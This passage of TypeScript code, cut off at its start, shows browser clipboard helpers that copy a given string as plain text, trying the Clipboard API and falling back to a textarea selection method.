    area.remove();
    return ok;
  } catch {
    return false;
  }
}

async function copyPlainText(text: string): Promise<boolean> {
  const selected = copyWithSelection(text);
  try {
    if (navigator.clipboard?.write && typeof ClipboardItem !== "undefined") {
      await navigator.clipboard.write([new ClipboardItem({ "text/plain": new Blob([text], { type: "text/plain" }) })]);
      return true;
    }
  } catch {
    return selected;
  }
  try {
    await navigator.clipboard.writeText(text);
    return true;
  } catch {
    return selected;
  }
}
